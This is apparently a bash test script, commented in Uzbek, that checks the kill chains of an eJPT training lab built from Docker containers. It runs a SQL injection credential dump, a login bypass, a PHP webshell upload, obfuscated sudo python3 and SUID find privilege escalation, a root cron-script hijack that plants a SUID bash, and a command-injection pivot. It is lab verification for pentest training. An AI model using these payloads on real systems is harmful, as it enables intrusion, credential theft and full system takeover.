#!/bin/bash
# eJPT Lab — barcha kill-chain'larni attacker konteyneridan tekshiradi.
# Ishlatish: docker compose up -d  &&  bash test-killchains.sh
set -u
A="docker exec ejpt-attacker sh -c"
pass=0; fail=0
chk(){ if echo "$2" | grep -q "$1"; then echo "  [PASS] $3"; pass=$((pass+1)); else echo "  [FAIL] $3 -- got: $(echo "$2"|tr '\n' ' '|cut -c1-120)"; fail=$((fail+1)); fi; }

echo "### 0) Host discovery + services"
OUT=$($A "nmap -sn 172.20.0.0/24 2>/dev/null | grep -oE '172.20.0.[0-9]+' | sort -u")
echo "$OUT" | sed 's/^/    /'
chk "172.20.0.10" "$OUT" "web-01 topildi"
chk "172.20.0.20" "$OUT" "linux-02 topildi"
chk "172.20.0.30" "$OUT" "smb-03 topildi"

echo "### 1) web-01: SQLi -> creds -> upload RCE -> www-data -> root"
# UNION SQLi -> sysadmin cred
SQLI=$($A "curl -s 'http://172.20.0.10/search.php?q=%25%27%20UNION%20SELECT%20username,password%20FROM%20users--%20-'")
chk "Ac3m3S3rv3r!" "$SQLI" "UNION SQLi sysadmin parolini dump qildi"
# upload webshell
$A "printf '<?php system(\$_GET[\"c\"]); ?>' > /tmp/sh.php && curl -s -c /tmp/cj -b /tmp/cj -d \"username=admin'--+-&password=x\" http://172.20.0.10/index.php -o /dev/null; curl -s -b /tmp/cj -F 'file=@/tmp/sh.php' http://172.20.0.10/dashboard.php -o /dev/null" >/dev/null 2>&1
RCE=$($A "curl -s 'http://172.20.0.10/uploads/sh.php?c=id'")
chk "www-data" "$RCE" "upload -> webshell RCE (www-data)"
UF=$($A "curl -s 'http://172.20.0.10/uploads/sh.php?c=cat+/var/www/html/user.txt'")
chk "EJPT{" "$UF" "web-01 USER flag"
# privesc via ssh sysadmin + sudo python3
ROOT=$($A "sshpass -p 'Ac3m3S3rv3r!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@172.20.0.10 'sudo /usr/bin/python3 -c \"import os;os.system(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(114)+chr(111)+chr(111)+chr(116)+chr(47)+chr(114)+chr(111)+chr(111)+chr(116)+chr(46)+chr(116)+chr(120)+chr(116))\"' 2>/dev/null")
chk "EJPT{" "$ROOT" "web-01 ROOT flag (sudo python3)"

echo "### 2) linux-02: anon FTP hint -> ssh bob -> SUID find -> root"
FTP=$($A "curl -s ftp://172.20.0.20/note_to_bob.txt")
chk "football" "$FTP" "anon FTP note (bob parol hint)"
LUF=$($A "sshpass -p football ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@172.20.0.20 'cat /home/bob/user.txt' 2>/dev/null")
chk "EJPT{" "$LUF" "linux-02 USER flag (ssh bob)"
LRF=$($A "sshpass -p football ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@172.20.0.20 \"find /home/bob/user.txt -exec /bin/sh -p -c 'cat /root/root.txt' \\;\" 2>/dev/null")
chk "EJPT{" "$LRF" "linux-02 ROOT flag (SUID find)"

echo "### 3) smb-03: null session -> creds -> ssh carol -> writable script -> root"
SMB=$($A "smbclient //172.20.0.30/public -N -c 'get credentials.txt /tmp/cr.txt' 2>/dev/null; cat /tmp/cr.txt 2>/dev/null")
chk "Fil3s3rv3r2025" "$SMB" "SMB null session creds leak"
SUF=$($A "sshpass -p Fil3s3rv3r2025 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null carol@172.20.0.30 'cat /home/carol/user.txt' 2>/dev/null")
chk "EJPT{" "$SUF" "smb-03 USER flag (ssh carol)"
# writable-script privesc: overwrite, wait for root loop, use SUID bash
$A "sshpass -p Fil3s3rv3r2025 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null carol@172.20.0.30 'echo \"cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\" > /opt/maintenance/cleanup.sh' 2>/dev/null"
sleep 24
SRF=$($A "sshpass -p Fil3s3rv3r2025 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null carol@172.20.0.30 '/tmp/rootbash -p -c \"cat /root/root.txt\"' 2>/dev/null")
chk "EJPT{" "$SRF" "smb-03 ROOT flag (writable root script -> SUID bash)"

echo "### 4) PIVOT: web-01 -> internal-04 (command injection) -> FINAL flag"
# attacker CANNOT reach 10.10.10.20 directly:
DIRECT=$($A "curl -s --max-time 5 http://10.10.10.20:8080/ 2>&1 | head -c 40; echo")
echo "    (attacker->internal to'g'ridan: '$DIRECT')"
# web-01 buzilgan -> o'sha hostdan ichki 10.10.10.20 ga command injection:
PIV=$(docker exec ejpt-web-01 sh -c "curl -s 'http://10.10.10.20:8080/ping?host=127.0.0.1;cat%20/flag.txt'")
chk "EJPT{" "$PIV" "internal-04 FINAL flag (pivot + cmd injection)"

echo ""
echo "### NATIJA: PASS=$pass  FAIL=$fail"
